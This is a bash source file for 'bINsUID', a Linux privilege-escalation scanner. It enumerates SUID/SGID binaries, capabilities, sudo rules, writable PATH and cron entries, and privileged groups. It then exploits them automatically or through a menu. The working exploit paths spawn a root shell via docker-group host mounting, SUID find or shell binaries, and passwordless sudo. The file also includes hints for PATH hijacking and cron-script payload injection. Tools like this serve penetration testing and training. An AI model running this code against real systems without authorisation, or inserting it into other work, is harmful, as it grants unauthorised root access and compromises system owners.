#!/usr/bin/env bash
# bINsUID bash scanner — privesc recon and auto-exploit without Python.
# Usage: binsuid-scan.sh [--quick] [--scan-only] [--auto] [-y] ...
VERSION="1.2.3"

QUICK=0
SILENT=0
SCAN_ONLY=0
NO_COLOR=0
DEBUG=0
AUTO=0
INTERACTIVE=0
ASSUME_YES=0
DRY_RUN=0
LAUNCH_SHELL=0
menu_bin=0 menu_path=0 menu_group=0 menu_sudo=0 menu_caps=0 menu_cron=0 MENU_MAX=0

for arg in "$@"; do
  case "$arg" in
    --quick|-q) QUICK=1 ;;
    --silent) SILENT=1 ;;
    --no-color) NO_COLOR=1 ;;
    --debug) DEBUG=1 ;;
    --auto) AUTO=1 ;;
    --interactive|-i) INTERACTIVE=1 ;;
    -y|--yes) ASSUME_YES=1; LAUNCH_SHELL=1 ;;
    --dry-run) DRY_RUN=1; AUTO=1 ;;
    --scan-only) SCAN_ONLY=1 ;;
    --json)
      echo "[-] --json needs python3 (binsuid --json --scan-only)." >&2
      exit 1
      ;;
    --upgrade|-u)
      d="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
      if [ -f "$d/upgrade-binsuid.sh" ]; then
        exec "$d/upgrade-binsuid.sh" --force "$@"
      fi
      echo "[-] --upgrade needs upgrade-binsuid.sh on this host." >&2
      exit 1
      ;;
    -V|--version) echo "binsuid-scan $VERSION (bash mode)"; exit 0 ;;
    -h|--help)
      echo "binsuid-scan $VERSION — scan vectors, then menu or auto"
      echo "  --quick  --scan-only  --auto  -y  --dry-run  --silent  --no-color"
      echo ""
      echo "Examples:"
      echo "  binsuid-scan.sh --quick        # scan → ask: menu (m) or auto (a)"
      echo "  binsuid-scan.sh --quick --scan-only   # recon only, no prompt"
      echo "  binsuid-scan.sh --quick --auto -y    # scan → auto-escalate"
      exit 0
      ;;
    *) echo "Unknown option: $arg" >&2; exit 2 ;;
  esac
done

dbg() { [ "$DEBUG" -eq 1 ] && echo "[debug] $*" >&2; }

use_color() {
  [ "$NO_COLOR" -eq 1 ] && return 1
  [ -n "${NO_COLOR:-}" ] && return 1
  [ -n "${FORCE_COLOR:-}" ] && return 0
  [ -t 1 ] && return 0
  return 1
}

init_colors() {
  if use_color; then
    RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'
    BLUE='\033[34m'; MAGENTA='\033[35m'; CYAN='\033[36m'
    BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'
  else
    RED=''; GREEN=''; YELLOW=''; BLUE=''; MAGENTA=''
    CYAN=''; BOLD=''; DIM=''; RESET=''
  fi
}

init_colors

# printf is more reliable than echo for ANSI on minimal shells
p() { printf '%b\n' "$*"; }

section() {
  # section COLOR "title"
  p "${1}${BOLD}>>> ${2}${RESET}"
}

tag_item() {
  # tag_item TAG_COLOR TAG "label" VALUE_COLOR "value"
  p "  ${2}[${3}]${RESET} ${5}${4}${RESET}"
}

is_known_suid() {
  case "$1" in
    /usr/bin/sudo|/usr/bin/su|/usr/bin/passwd|/usr/bin/chfn|/usr/bin/chsh|\
/usr/bin/newgrp|/usr/bin/gpasswd|/usr/bin/mount|/usr/bin/umount|/usr/bin/pkexec|\
/usr/lib/openssh/ssh-keysign|/bin/mount|/bin/umount|/bin/su)
      return 0 ;;
  esac
  return 1
}

SUID_PRIORITY=""
SUID_NOISE=""
SGID_FOUND=""
CAP_FOUND=""
PATH_FOUND=""
CRON_FOUND=""
GROUP_FOUND=""
ERRORS=""
SUDO_OUT=""
PRIORITY_COUNT=0

add_line() {
  # add_line VAR "line"
  eval "$1=\"\${$1}\${$1:+\$'\n'}\$2\""
}

scan_suid() {
  dbg "scan_suid quick=$QUICK"
  local roots paths f
  if [ "$QUICK" -eq 1 ]; then
    roots="/usr/local/bin /usr/local/sbin /opt /home /var /tmp /snap/bin /usr/bin /usr/sbin /bin /sbin"
  else
    roots="/"
  fi

  if ! command -v find >/dev/null 2>&1; then
    ERRORS="${ERRORS}${ERRORS:+$'\n'}find not found"
    return
  fi

  if [ "$QUICK" -eq 1 ]; then
    for root in $roots; do
      [ -d "$root" ] || continue
      paths="$(find "$root" -xdev -type f -perm -4000 2>/dev/null)" || paths=""
      for f in $paths; do
        [ -n "$f" ] || continue
        if is_known_suid "$f"; then
          add_line SUID_NOISE "$f"
        else
          add_line SUID_PRIORITY "$f"
        fi
      done
    done
  else
    paths="$(find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o \
      -type f -perm -4000 -print 2>/dev/null)" || paths=""
    for f in $paths; do
      [ -n "$f" ] || continue
      if is_known_suid "$f"; then
        add_line SUID_NOISE "$f"
      else
        add_line SUID_PRIORITY "$f"
      fi
    done
  fi
}

scan_sgid() {
  dbg "scan_sgid"
  local roots="/usr/bin /usr/sbin /usr/local/bin /opt /bin /sbin /home /var"
  local f paths
  command -v find >/dev/null 2>&1 || return
  for root in $roots; do
    [ -d "$root" ] || continue
    paths="$(find "$root" -xdev -type f -perm -2000 2>/dev/null)" || paths=""
    for f in $paths; do
      [ -n "$f" ] && add_line SGID_FOUND "$f"
    done
  done
}

scan_capabilities() {
  dbg "scan_capabilities"
  command -v getcap >/dev/null 2>&1 || {
    ERRORS="${ERRORS}${ERRORS:+$'\n'}getcap not found"
    return
  }
  local root line
  for root in /usr/bin /usr/sbin /bin /sbin /usr/local/bin /opt /home; do
    [ -e "$root" ] || continue
  done
  while IFS= read -r line; do
    [ -n "$line" ] && add_line CAP_FOUND "$line"
  done <<EOF
$(getcap -r /usr /opt /home 2>/dev/null | grep -E 'cap_setuid|cap_setgid|cap_sys_admin|cap_dac_read_search|cap_setfcap' 2>/dev/null || true)
EOF
}

scan_sudo() {
  dbg "scan_sudo"
  command -v sudo >/dev/null 2>&1 || {
    ERRORS="${ERRORS}${ERRORS:+$'\n'}sudo not found"
    return
  }
  SUDO_OUT="$(sudo -n -l 2>/dev/null)" || {
    ERRORS="${ERRORS}${ERRORS:+$'\n'}sudo -l requires password"
    SUDO_OUT=""
  }
}

scan_path() {
  dbg "scan_path"
  local d mode other old_ifs
  old_ifs="$IFS"
  IFS=':'
  for d in ${PATH:-/usr/bin:/bin}; do
    [ -d "$d" ] || continue
    if [ -w "$d" ]; then
      add_line PATH_FOUND "$d (writable)"
      continue
    fi
    mode="$(stat -c '%a' "$d" 2>/dev/null)" || mode=""
    if [ -n "$mode" ]; then
      other=$((mode % 10))
      [ "$other" -ge 2 ] && add_line PATH_FOUND "$d (world-writable)"
    fi
  done
  IFS="$old_ifs"
}

scan_cron() {
  dbg "scan_cron"
  local f line script
  for f in /etc/crontab /etc/cron.d/*; do
    [ -r "$f" ] || continue
    while IFS= read -r line; do
      case "$line" in \#*|"") continue ;; esac
      for script in $(echo "$line" | grep -oE '/[[:alnum:]_.~/-]+' 2>/dev/null || true); do
        if [ -f "$script" ] && [ -w "$script" ]; then
          add_line CRON_FOUND "$script (writable, from $f)"
        fi
      done
    done < "$f"
  done
}

scan_groups() {
  dbg "scan_groups"
  local groups g hint
  groups="$(id -Gn 2>/dev/null | tr '[:upper:]' '[:lower:]')" || groups=""
  [ -n "$groups" ] || return 0
  for g in docker lxd disk adm sudo wheel; do
    echo " $groups " | grep -q " $g " 2>/dev/null || continue
    case "$g" in
      docker) hint="docker run -v /:/mnt --rm -it alpine chroot /mnt sh" ;;
      lxd)    hint="privileged lxc container" ;;
      disk)   hint="debugfs block device access" ;;
      adm)    hint="read /var/log/auth.log" ;;
      *)      hint="sudo -l" ;;
    esac
    add_line GROUP_FOUND "$g — $hint"
  done
}

count_lines() {
  if [ -z "$1" ]; then echo 0; return; fi
  echo "$1" | grep -c '.' || echo 0
}

member_of_group() {
  local g="$1"
  id -Gn 2>/dev/null | tr '[:upper:]' '[:lower:]' | grep -qw "$g"
}

should_launch_shell() {
  { [ "$ASSUME_YES" -eq 1 ] || [ "$LAUNCH_SHELL" -eq 1 ]; } \
    && [ -t 0 ] && [ -t 1 ]
}

try_docker_group() {
  member_of_group docker || return 1
  command -v docker >/dev/null 2>&1 || return 1
  local cmd="docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
  local verify="docker run -v /:/mnt --rm alpine chroot /mnt sh -c 'id -u'"
  p "${YELLOW}[*] Trying docker group escalation...${RESET}"
  if [ "$DRY_RUN" -eq 1 ]; then
    p "${GREEN}[+] Dry-run:${RESET} $verify"
    p "    then: $cmd"
    return 0
  fi
  local uid
  uid="$(docker run -v /:/mnt --rm alpine chroot /mnt sh -c 'id -u' 2>/dev/null)" || return 1
  [ "$uid" = "0" ] || return 1
  p "${GREEN}[+] SUCCESS — root via docker group (host at /mnt in container)${RESET}"
  if should_launch_shell; then
    p "${CYAN}[*] Launching root shell (exit to return)...${RESET}"
    exec $cmd
  fi
  p "${CYAN}[*] Run manually:${RESET} $cmd"
  return 0
}

try_suid_binary() {
  local bin="$1" name="${bin##*/}" cmd="" out=""
  [ -x "$bin" ] || return 1
  case "$name" in
    find)
      cmd="cd / && $bin . -exec /bin/sh -p \\; -quit"
      p "${YELLOW}[*] Trying SUID $bin ...${RESET}"
      if [ "$DRY_RUN" -eq 1 ]; then
        p "${GREEN}[+] Dry-run:${RESET} $cmd"
        return 0
      fi
      (cd / && "$bin" . -exec /bin/sh -p -c 'id -u' \; -quit 2>/dev/null) | grep -q '^0$' || return 1
      ;;
    bash|sh|dash|ash|zsh|ksh)
      cmd="$bin -p"
      p "${YELLOW}[*] Trying SUID $bin ...${RESET}"
      if [ "$DRY_RUN" -eq 1 ]; then
        p "${GREEN}[+] Dry-run:${RESET} $cmd"
        return 0
      fi
      out="$("$bin" -p -c 'id -u' 2>/dev/null)" || return 1
      [ "$out" = "0" ] || return 1
      ;;
    *)
      return 1
      ;;
  esac
  p "${GREEN}[+] SUCCESS — SUID $name${RESET}"
  if should_launch_shell; then
    p "${CYAN}[*] Launching root shell (exit to return)...${RESET}"
    eval "exec $cmd"
  fi
  p "${CYAN}[*] Run:${RESET} $cmd"
  return 0
}

try_sudo_nopasswd() {
  [ -n "$SUDO_OUT" ] || return 1
  echo "$SUDO_OUT" | grep -qiE 'NOPASSWD.*\bALL\b' || return 1
  local cmd="sudo -n /bin/sh"
  p "${YELLOW}[*] Trying NOPASSWD sudo ALL...${RESET}"
  if [ "$DRY_RUN" -eq 1 ]; then
    p "${GREEN}[+] Dry-run:${RESET} $cmd"
    return 0
  fi
  sudo -n /bin/sh -c 'id -u' 2>/dev/null | grep -q '^0$' || return 1
  p "${GREEN}[+] SUCCESS — NOPASSWD sudo${RESET}"
  should_launch_shell && exec $cmd
  p "${CYAN}[*] Run:${RESET} $cmd"
  return 0
}

auto_escalate() {
  p ""
  p "${CYAN}${BOLD}>>> Auto-exploit${RESET}"
  try_docker_group && return 0
  if [ -n "$SUID_PRIORITY" ]; then
    local bin old_ifs
    old_ifs="$IFS"
    IFS=$'\n'
    for bin in $SUID_PRIORITY; do
      [ -n "$bin" ] && try_suid_binary "$bin" && { IFS="$old_ifs"; return 0; }
    done
    IFS="$old_ifs"
  fi
  try_sudo_nopasswd && return 0
  p "${RED}[-] No automatic escalation succeeded.${RESET}"
  return 1
}

exploit_binaries() {
  p ""
  p "${CYAN}${BOLD}>>> SUID binaries${RESET}"
  if [ -z "$SUID_PRIORITY" ]; then
    p "${DIM}  No custom SUID targets to auto-exploit.${RESET}"
    return 1
  fi
  local bin old_ifs
  old_ifs="$IFS"
  IFS=$'\n'
  for bin in $SUID_PRIORITY; do
    [ -n "$bin" ] && try_suid_binary "$bin" && { IFS="$old_ifs"; return 0; }
  done
  IFS="$old_ifs"
  p "${YELLOW}[-] No auto SUID payload worked for listed binaries.${RESET}"
  return 1
}

menu_hint() {
  if [ -n "$GROUP_FOUND" ] && member_of_group docker; then
    p "${CYAN}  Tip: try ${BOLD}Privileged groups${RESET}${CYAN} or ${BOLD}a${RESET}${CYAN} (auto).${RESET}"
  elif [ -n "$SUID_PRIORITY" ]; then
    p "${CYAN}  Tip: try ${BOLD}SUID binaries${RESET}${CYAN} or ${BOLD}a${RESET}${CYAN} (auto).${RESET}"
  fi
}

show_escalation_menu() {
  local max=0
  menu_bin=0 menu_path=0 menu_group=0 menu_sudo=0 menu_caps=0 menu_cron=0

  p ""
  p "${CYAN}${BOLD}>>> Escalation menu${RESET}"
  p "${DIM}  Pick a vector, or ${BOLD}a${RESET}${DIM} for automatic (best first).${RESET}"

  if [ -n "$SUID_PRIORITY" ]; then
    max=$((max + 1)); menu_bin=$max
    p "  ${BOLD}$max${RESET}) SUID binaries  ${DIM}($(count_lines "$SUID_PRIORITY") auto targets)${RESET}"
  fi
  if [ -n "$PATH_FOUND" ]; then
    max=$((max + 1)); menu_path=$max
    p "  ${BOLD}$max${RESET}) Writable PATH  ${DIM}($(count_lines "$PATH_FOUND") dirs — hijack guide)${RESET}"
  fi
  if [ -n "$GROUP_FOUND" ]; then
    max=$((max + 1)); menu_group=$max
    p "  ${BOLD}$max${RESET}) Privileged groups  ${DIM}(docker, lxd — auto)${RESET}"
  fi
  if [ -n "$SUDO_OUT" ]; then
    max=$((max + 1)); menu_sudo=$max
    p "  ${BOLD}$max${RESET}) Sudo rules"
  fi
  if [ -n "$CAP_FOUND" ]; then
    max=$((max + 1)); menu_caps=$max
    p "  ${BOLD}$max${RESET}) Capabilities  ${DIM}(manual)${RESET}"
  fi
  if [ -n "$CRON_FOUND" ]; then
    max=$((max + 1)); menu_cron=$max
    p "  ${BOLD}$max${RESET}) Writable cron  ${DIM}(manual)${RESET}"
  fi

  p "  ${BOLD}a${RESET}) Auto — try best vector first"
  p "  ${BOLD}q${RESET}) Quit"
  MENU_MAX=$max
}

interactive_menu() {
  local choice=0

  if [ -z "$SUID_PRIORITY" ] && [ -z "$PATH_FOUND" ] && [ -z "$GROUP_FOUND" ] \
     && [ -z "$SUDO_OUT" ] && [ -z "$CAP_FOUND" ] && [ -z "$CRON_FOUND" ]; then
    p "${YELLOW}[-] No escalation targets in menu.${RESET}"
    return 1
  fi

  if [ -n "$SGID_FOUND" ] && [ -z "$SUID_PRIORITY" ]; then
    p "${DIM}  SGID binaries are listed above — system noise, not auto-exploitable here.${RESET}"
  fi

  while true; do
    show_escalation_menu

    if [ "$MENU_MAX" -eq 0 ]; then
      p "${YELLOW}[-] No auto targets — use ${BOLD}a${RESET}${YELLOW} or install python3 binsuid.${RESET}"
      printf "${CYAN}Select [a / q]: ${RESET}"
    else
      printf "${CYAN}Select [1-%s / a / q]: ${RESET}" "$MENU_MAX"
    fi

    if ! IFS= read -r choice; then
      p "${DIM}  EOF — exiting menu.${RESET}"
      return 0
    fi

    case "$choice" in
      q|Q)
        p "${DIM}  Quit — scan results kept above.${RESET}"
        return 0
        ;;
      a|A)
        LAUNCH_SHELL=1
        if auto_escalate; then
          return 0
        fi
        p ""
        p "${DIM}  Auto failed — back to menu.${RESET}"
        menu_hint
        continue
        ;;
    esac

    if [ "$menu_bin" -gt 0 ] && [ "$choice" = "$menu_bin" ]; then
      LAUNCH_SHELL=1
      exploit_binaries && return 0
      p ""; p "${DIM}  Back to menu.${RESET}"; menu_hint; continue
    fi
    if [ "$menu_path" -gt 0 ] && [ "$choice" = "$menu_path" ]; then
      exploit_path
      p ""; p "${DIM}  Back to menu.${RESET}"; menu_hint; continue
    fi
    if [ "$menu_group" -gt 0 ] && [ "$choice" = "$menu_group" ]; then
      LAUNCH_SHELL=1
      exploit_groups && return 0
      p ""; p "${DIM}  Back to menu.${RESET}"; continue
    fi
    if [ "$menu_sudo" -gt 0 ] && [ "$choice" = "$menu_sudo" ]; then
      LAUNCH_SHELL=1
      exploit_sudo && return 0
      p ""; p "${DIM}  Back to menu.${RESET}"; continue
    fi
    if [ "$menu_caps" -gt 0 ] && [ "$choice" = "$menu_caps" ]; then
      exploit_capabilities
      p ""; p "${DIM}  Back to menu.${RESET}"; continue
    fi
    if [ "$menu_cron" -gt 0 ] && [ "$choice" = "$menu_cron" ]; then
      exploit_cron
      p ""; p "${DIM}  Back to menu.${RESET}"; continue
    fi

    if [ "$MENU_MAX" -eq 0 ]; then
      p "${RED}  Invalid. Enter a or q.${RESET}"
    else
      p "${RED}  Invalid. Enter 1-$MENU_MAX, a, or q.${RESET}"
    fi
  done
}

post_scan_choice() {
  p ""
  p "${CYAN}${BOLD}>>> Next step${RESET}"
  p "${DIM}  Vectors found — choose how to escalate.${RESET}"
  p "  ${BOLD}m${RESET}) Menu — pick a vector (1, 2, 3…)"
  p "  ${BOLD}a${RESET}) Auto — try best vector first"
  p "  ${BOLD}q${RESET}) Quit — keep scan results only"
  while true; do
    printf "${CYAN}Escalate? [m / a / q]: ${RESET}"
    IFS= read -r choice || { p "${DIM}  Quit.${RESET}"; return 0; }
    case "$choice" in
      q|Q)
        p "${DIM}  Quit — results above.${RESET}"
        return 0
        ;;
      a|A)
        LAUNCH_SHELL=1
        auto_escalate
        return $?
        ;;
      m|M)
        interactive_menu
        return 0
        ;;
      *)
        p "${RED}  Enter m (menu), a (auto), or q (quit).${RESET}"
        ;;
    esac
  done
}

exploit_path() {
  p ""
  p "${CYAN}${BOLD}>>> Writable PATH${RESET}"
  [ -n "$PATH_FOUND" ] || { p "${DIM}  No writable PATH entries.${RESET}"; return 1; }
  echo "$PATH_FOUND" | while IFS= read -r line; do
    [ -n "$line" ] && p "  ${YELLOW}[PATH]${RESET} $line"
  done
  p ""
  p "${DIM}  Hijack: place a fake binary in a writable PATH dir before cron/service runs.${RESET}"
  p "${DIM}  Example: echo '#!/bin/sh' > /path/writable/cmd && chmod +x /path/writable/cmd${RESET}"
  if [ -n "$CRON_FOUND" ]; then
    p ""
    p "${YELLOW}[!] Writable cron scripts:${RESET}"
    echo "$CRON_FOUND" | while IFS= read -r c; do
      [ -n "$c" ] && p "  $c"
    done
  fi
  return 1
}

exploit_groups() {
  p ""
  p "${CYAN}${BOLD}>>> Privileged groups${RESET}"
  member_of_group docker && try_docker_group && return 0
  if [ -n "$GROUP_FOUND" ]; then
    p "${YELLOW}[!] Manual steps for other groups:${RESET}"
    echo "$GROUP_FOUND" | while IFS= read -r g; do
      [ -n "$g" ] && p "  ${GREEN}[GROUP]${RESET} $g"
    done
  fi
  return 1
}

exploit_sudo() {
  p ""
  p "${CYAN}${BOLD}>>> Sudo${RESET}"
  try_sudo_nopasswd && return 0
  if [ -n "$SUDO_OUT" ]; then
    p "${YELLOW}[!] Sudo rules (no NOPASSWD ALL auto payload):${RESET}"
    echo "$SUDO_OUT" | while IFS= read -r s; do
      [ -n "$s" ] && p "  $s"
    done
  else
    p "${DIM}  No passwordless sudo rules.${RESET}"
  fi
  return 1
}

exploit_capabilities() {
  p ""
  p "${CYAN}${BOLD}>>> Capabilities${RESET}"
  [ -n "$CAP_FOUND" ] || { p "${DIM}  No dangerous capabilities found.${RESET}"; return 1; }
  echo "$CAP_FOUND" | while IFS= read -r c; do
    [ -n "$c" ] && p "  ${MAGENTA}[CAPS]${RESET} $c"
  done
  p "${DIM}  Install python3 + binsuid for automatic cap abuse.${RESET}"
  return 1
}

exploit_cron() {
  p ""
  p "${CYAN}${BOLD}>>> Writable cron${RESET}"
  [ -n "$CRON_FOUND" ] || { p "${DIM}  No writable cron scripts.${RESET}"; return 1; }
  echo "$CRON_FOUND" | while IFS= read -r c; do
    [ -n "$c" ] && p "  ${YELLOW}[CRON]${RESET} $c"
  done
  p "${DIM}  Edit script before next cron run to execute your payload.${RESET}"
  return 1
}

# --- run scans ---
scan_suid
scan_sgid
scan_capabilities
scan_sudo
scan_path
scan_cron
scan_groups

PRIORITY_COUNT=$(( $(count_lines "$SUID_PRIORITY") + $(count_lines "$SGID_FOUND") + \
  $(count_lines "$CAP_FOUND") + $(count_lines "$PATH_FOUND") + \
  $(count_lines "$CRON_FOUND") + $(count_lines "$GROUP_FOUND") ))
[ -n "$SUDO_OUT" ] && PRIORITY_COUNT=$((PRIORITY_COUNT + 1))

if [ "$SILENT" -eq 1 ]; then
  p "Priority: $PRIORITY_COUNT | SUID: $(count_lines "$SUID_PRIORITY") | bash $VERSION"
  [ "$PRIORITY_COUNT" -gt 0 ] && exit 1 || exit 0
fi

p "${CYAN}==============================================${RESET}"
p "${BOLD}  bINsUID scan (bash ${CYAN}$VERSION${RESET}${BOLD})${RESET}"
p "${CYAN}==============================================${RESET}"
if [ "$AUTO" -eq 1 ]; then
  p "${DIM}  Auto-exploit after scan.${RESET}"
elif [ "$SCAN_ONLY" -eq 1 ]; then
  p "${DIM}  Scan only — no escalation prompt.${RESET}"
elif [ "$INTERACTIVE" -eq 1 ]; then
  p "${DIM}  Interactive menu after scan.${RESET}"
else
  p "${DIM}  Scan → then choose: ${BOLD}m${RESET}${DIM}enu, ${BOLD}a${RESET}${DIM}uto, or ${BOLD}q${RESET}${DIM}uit.${RESET}"
fi
p ""

if [ -n "$SUID_PRIORITY" ]; then
  section "$RED" "SUID priority targets"
  echo "$SUID_PRIORITY" | while IFS= read -r p; do
    [ -n "$p" ] && tag_item "$RED" "$RED" "SUID" "$BOLD" "$p"
  done
  p ""
fi

if [ -n "$SGID_FOUND" ]; then
  section "$RED" "SGID binaries"
  echo "$SGID_FOUND" | while IFS= read -r p; do
    [ -n "$p" ] && tag_item "$RED" "$RED" "SGID" "" "$p"
  done
  p ""
fi

if [ -n "$SUDO_OUT" ]; then
  section "$CYAN" "Sudo rules"
  echo "$SUDO_OUT" | while IFS= read -r p; do
    [ -n "$p" ] && tag_item "$CYAN" "$CYAN" "SUDO" "" "$p"
  done
  p ""
fi

if [ -n "$CAP_FOUND" ]; then
  section "$MAGENTA" "Dangerous capabilities"
  echo "$CAP_FOUND" | while IFS= read -r p; do
    [ -n "$p" ] && tag_item "$MAGENTA" "$MAGENTA" "CAPS" "" "$p"
  done
  p ""
fi

if [ -n "$PATH_FOUND" ]; then
  section "$YELLOW" "Writable PATH"
  echo "$PATH_FOUND" | while IFS= read -r p; do
    [ -n "$p" ] && tag_item "$YELLOW" "$YELLOW" "PATH" "" "$p"
  done
  p ""
fi

if [ -n "$CRON_FOUND" ]; then
  section "$YELLOW" "Writable cron scripts"
  echo "$CRON_FOUND" | while IFS= read -r p; do
    [ -n "$p" ] && tag_item "$YELLOW" "$YELLOW" "CRON" "" "$p"
  done
  p ""
fi

if [ -n "$GROUP_FOUND" ]; then
  section "$GREEN" "Privileged groups"
  echo "$GROUP_FOUND" | while IFS= read -r p; do
    [ -n "$p" ] && tag_item "$GREEN" "$GREEN" "GROUP" "$BOLD" "$p"
  done
  p ""
fi

p "${CYAN}${BOLD}Summary${RESET}"
p "  ${BOLD}Priority targets${RESET}    : ${MAGENTA}${BOLD}$PRIORITY_COUNT${RESET}"
p "  ${DIM}System SUID hidden${RESET}  : $(count_lines "$SUID_NOISE")"

if [ -n "$ERRORS" ]; then
  p ""
  p "${YELLOW}${BOLD}Warnings${RESET}"
  echo "$ERRORS" | while IFS= read -r e; do
    [ -n "$e" ] && p "  ${YELLOW}-${RESET} ${DIM}$e${RESET}"
  done
fi

if [ "$PRIORITY_COUNT" -eq 0 ]; then
  p ""
  p "${YELLOW}No custom targets in quick paths. Try full scan or manual:${RESET}"
  p "  ${DIM}find / -perm -4000 -type f 2>/dev/null | grep -vE 'passwd|mount|su\$|...'${RESET}"
  p "  ${DIM}find /home /var /opt -writable -type f 2>/dev/null | head -20${RESET}"
  p "  ${DIM}getcap -r / 2>/dev/null${RESET}"
fi

if [ "$AUTO" -eq 1 ]; then
  auto_escalate
  exit $?
fi

if [ "$INTERACTIVE" -eq 1 ] && [ "$PRIORITY_COUNT" -gt 0 ]; then
  interactive_menu
  exit 0
fi

if [ "$SCAN_ONLY" -eq 1 ] || [ "$SILENT" -eq 1 ]; then
  [ "$PRIORITY_COUNT" -gt 0 ] && exit 1 || exit 0
fi

if [ "$PRIORITY_COUNT" -gt 0 ] && [ -t 0 ] && [ -t 1 ]; then
  post_scan_choice
  exit 0
fi

[ "$PRIORITY_COUNT" -gt 0 ] && exit 1 || exit 0
